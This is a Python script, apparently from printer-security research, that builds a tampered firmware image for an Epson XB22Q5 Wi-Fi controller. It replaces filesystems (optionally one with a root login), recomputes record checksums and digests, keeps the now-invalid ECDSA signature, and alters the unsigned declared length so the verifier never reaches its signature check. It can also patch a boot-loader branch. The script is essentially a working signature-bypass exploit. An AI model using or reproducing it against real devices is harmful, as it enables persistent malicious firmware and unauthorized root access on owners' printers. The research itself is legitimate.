#!/usr/bin/env python3
"""Build an offline XB22Q5 Wi-Fi image for the controller length-gate test.

This does not prove device acceptance. It retains the original ECDSA signature,
which is invalid over the changed payload, and changes the unsigned declared
length to keep the mapped controller verifier from reaching its final check.
The binary output must be kept outside this research repository.
"""

import argparse
import hashlib
from pathlib import Path
import struct

ORIGINAL_SHA256 = '103c9514e57f143f2619abcd280bd4d0926abf5370e03d28753a334ae02cd675'
FIRST_SQUASHFS_OFFSET = 0xEA7112
FIRST_SQUASHFS_USED = 2008372
SQUASHFS_OFFSET = 0x1197112
SQUASHFS_USED = 2630538
SIGN_OFFSET = 0x112
PAYLOAD_OFFSET = SIGN_OFFSET + 4096
IPL0_CODE_OFFSET = 0x4112
IPL0_FINALIZER_BRANCH = IPL0_CODE_OFFSET + 0x97D0


def records(image: bytes, trailing_bytes: int = 0):
    pos = PAYLOAD_OFFSET
    for expected_id in range(3):
        header = image[pos:pos + 4096]
        if not header.startswith(b'EPSON IPLJ6XB'):
            raise ValueError(f'missing record {expected_id} at {pos:#x}')
        ident = struct.unpack_from('<H', header, 0x38)[0]
        first = struct.unpack_from('<I', header, 0x1c)[0]
        second = struct.unpack_from('<I', header, 0x40)[0]
        if ident != expected_id or first != 8192:
            raise ValueError('unexpected record layout')
        a = image[pos + 4096:pos + 4096 + first]
        b = image[pos + 4096 + first:pos + 4096 + first + second]
        if len(a) != first or len(b) != second:
            raise ValueError('truncated record body')
        yield pos, header, a, b
        pos += 4096 + first + second
    if pos != len(image) - trailing_bytes:
        raise ValueError('three records do not end at expected boundary')


def record_integrity(image: bytes, trailing_bytes: int = 0):
    for pos, header, a, b in records(image, trailing_bytes):
        expected_first_sum = struct.unpack_from('<H', header, 0x12)[0]
        expected_second_sum = struct.unpack_from('<H', header, 0x36)[0]
        expected_sha1 = header[0x44:0x58]
        actual_sha1 = hashlib.sha1(b + hashlib.sha1(header[:14]).digest()).digest()
        yield (pos, (sum(a) & 0xffff) == expected_first_sum,
               (sum(b) & 0xffff) == expected_second_sum,
               actual_sha1 == expected_sha1)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('original_rcx', type=Path)
    parser.add_argument('replacement_squashfs', type=Path)
    parser.add_argument('output_rcx', type=Path)
    parser.add_argument('--replacement-first-squashfs', type=Path,
                        help='optional first SquashFS with a protected root login')
    parser.add_argument('--append-byte', action='store_true',
                        help='append one byte and increase unsigned Z_1 size to match declared length')
    parser.add_argument('--patch-ipl-finalizer', action='store_true',
                        help='offline control: redirect the first IPL positive-length rejection branch')
    args = parser.parse_args()
    if args.original_rcx.resolve() == args.output_rcx.resolve():
        parser.error('output must differ from original')
    original = args.original_rcx.read_bytes()
    if hashlib.sha256(original).hexdigest() != ORIGINAL_SHA256:
        parser.error('input is not the pinned XB22Q5 RCX')
    if not all(first_sum and second_sum and digest
               for _, first_sum, second_sum, digest in record_integrity(original)):
        parser.error('original record integrity check failed')
    if original[SIGN_OFFSET:SIGN_OFFSET + 14] != b'EPSONSIGNXB20d':
        parser.error('unexpected signature header')
    declared = struct.unpack_from('<I', original, SIGN_OFFSET + 16)[0]
    if declared != len(original) - PAYLOAD_OFFSET:
        parser.error('original signed length mismatch')

    replacement = args.replacement_squashfs.read_bytes()
    if original[SQUASHFS_OFFSET:SQUASHFS_OFFSET + 4] != b'hsqs' or replacement[:4] != b'hsqs':
        parser.error('SquashFS magic missing')
    used = struct.unpack_from('<Q', replacement, 40)[0]
    if used < 4096 or used > SQUASHFS_USED or used > len(replacement):
        parser.error('replacement SquashFS does not fit original slot')
    candidate = bytearray(original)
    if args.replacement_first_squashfs:
        first_replacement = args.replacement_first_squashfs.read_bytes()
        if original[FIRST_SQUASHFS_OFFSET:FIRST_SQUASHFS_OFFSET + 4] != b'hsqs' or first_replacement[:4] != b'hsqs':
            parser.error('first SquashFS magic missing')
        first_used = struct.unpack_from('<Q', first_replacement, 40)[0]
        if first_used < 4096 or first_used > len(first_replacement):
            parser.error('invalid first SquashFS size')
        if FIRST_SQUASHFS_OFFSET + first_used >= SQUASHFS_OFFSET:
            parser.error('first SquashFS overlaps the second')
        padding = original[FIRST_SQUASHFS_OFFSET + FIRST_SQUASHFS_USED:FIRST_SQUASHFS_OFFSET + first_used]
        if any(padding):
            parser.error('first SquashFS extension would overwrite nonpadding bytes')
        candidate[FIRST_SQUASHFS_OFFSET:FIRST_SQUASHFS_OFFSET + first_used] = first_replacement[:first_used]
    else:
        first_used = None
    candidate[SQUASHFS_OFFSET:SQUASHFS_OFFSET + SQUASHFS_USED] = replacement[:used].ljust(SQUASHFS_USED, b'\0')
    if args.patch_ipl_finalizer:
        instruction = struct.unpack_from('<I', candidate, IPL0_FINALIZER_BRANCH)[0]
        if instruction != 0x1A000007:
            raise ValueError('unexpected first IPL finalizer branch instruction')
        struct.pack_into('<I', candidate, IPL0_FINALIZER_BRANCH, 0x1A000009)
    changed_records = []
    for pos, header, _, b in records(candidate):
        second_sum = sum(b) & 0xffff
        if second_sum != struct.unpack_from('<H', header, 0x36)[0]:
            struct.pack_into('<H', candidate, pos + 0x36, second_sum)
        digest = hashlib.sha1(b + hashlib.sha1(header[:14]).digest()).digest()
        if digest != header[0x44:0x58]:
            candidate[pos + 0x44:pos + 0x58] = digest
            changed_records.append((pos, digest.hex()))
    struct.pack_into('<I', candidate, SIGN_OFFSET + 16, declared + 1)
    if args.append_byte:
        envelope_size = len(original) - SIGN_OFFSET
        old = f'5="{envelope_size}"'.encode()
        new = f'5="{envelope_size + 1}"'.encode()
        if len(old) != len(new) or candidate[:SIGN_OFFSET].count(old) != 1:
            raise ValueError('cannot update unsigned Z_1 size')
        candidate[:SIGN_OFFSET] = candidate[:SIGN_OFFSET].replace(old, new)
        candidate.append(0)
    trailing = int(args.append_byte)
    if len(candidate) != len(original) + trailing:
        raise AssertionError('unexpected candidate size')
    if not all(first_sum and second_sum and digest
               for _, first_sum, second_sum, digest in record_integrity(candidate, trailing)):
        raise AssertionError('candidate record integrity check failed')
    if candidate[SIGN_OFFSET + 32:SIGN_OFFSET + 96] != original[SIGN_OFFSET + 32:SIGN_OFFSET + 96]:
        raise AssertionError('original signature was changed')
    args.output_rcx.parent.mkdir(parents=True, exist_ok=True)
    args.output_rcx.write_bytes(candidate)
    print('source_sha256', hashlib.sha256(original).hexdigest())
    print('candidate_sha256', hashlib.sha256(candidate).hexdigest())
    print('replacement_squashfs_used', used)
    print('replacement_first_squashfs_used', first_used)
    print('declared_payload_length', declared, '->', declared + 1)
    print('trailing_bytes', trailing)
    print('first_ipl_finalizer_branch_patch', args.patch_ipl_finalizer)
    print('recomputed_record_digests', changed_records)
    print('record_checks', list(record_integrity(candidate, trailing)))
    print('No printer contact was made.')


if __name__ == '__main__':
    main()
